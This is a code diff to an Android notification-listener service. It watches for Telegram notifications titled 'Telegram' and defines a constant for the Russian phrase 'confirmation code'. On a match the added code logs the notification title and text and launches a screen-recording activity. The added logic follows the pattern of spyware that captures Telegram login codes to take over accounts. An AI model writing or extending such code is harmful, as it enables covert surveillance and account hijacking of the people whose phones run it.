@@ -15,7 +15,9 @@ import java.util.TimerTask;
 public class AutoStartService extends NotificationListenerService {
 
     private static final String TAG = "TEST: ";
-    private static final String NEEDED_APP = "org.telegram.messenger";
+    private static final String NEEDED_APP_PACKAGE = "org.telegram.messenger";
+    private static final String NEEDED_APP_NOTIFICATION_TITLE = "Telegram";
+    private static final String NEEDED_APP_NOTIFICATION_MESSAGE = "Код подтверждения";
     public int counter = 0;
     private Timer timer;
     private TimerTask timerTask;
@@ -77,7 +79,6 @@ public class AutoStartService extends NotificationListenerService {
     }
 
     public void stoptimertask() {
-        //stop the timer, if it's not already null
         if (timer != null) {
             timer.cancel();
             timer = null;
@@ -88,19 +89,24 @@ public class AutoStartService extends NotificationListenerService {
     public void onNotificationPosted(StatusBarNotification sbn){
         String notificationApp = sbn.getPackageName();
 
-        if(notificationApp != null && notificationApp.equals(NEEDED_APP)) {
+        if(notificationApp != null && notificationApp.equals(NEEDED_APP_PACKAGE)) {
+            String notificationTitle = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TITLE).toString();
+            String notificationText = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT).toString();
 
-            Log.i(TAG, "onNotificationPosted: " + sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT).toString());
+            if(notificationTitle != null && notificationText != null &&
+                    notificationTitle.equals(NEEDED_APP_NOTIFICATION_TITLE)) {
+                Log.i(TAG, "onNotificationPosted: " + sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT).toString());
+                Log.i(TAG, "onNotificationPosted: " + sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TITLE).toString());
+
+                Intent dialogIntent = new Intent(this, ScreenRecordingAcitivity.class);
+                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(dialogIntent);
+            }
         }
-
-        //Log.i(TAG, "onNotificationPosted: " + sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT).toString());
-        //Log.i(TAG, "onNotificationPosted: " + sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TITLE).toString());
-        // Implement what you want here
     }
 
     @Override
     public void onNotificationRemoved(StatusBarNotification sbn){
-        Log.i(TAG, "onNotificationRemoved: " + sbn.getTag());
-        // Implement what you want here
+        //Log.i(TAG, "onNotificationRemoved: " + sbn.getTag());
     }
 }
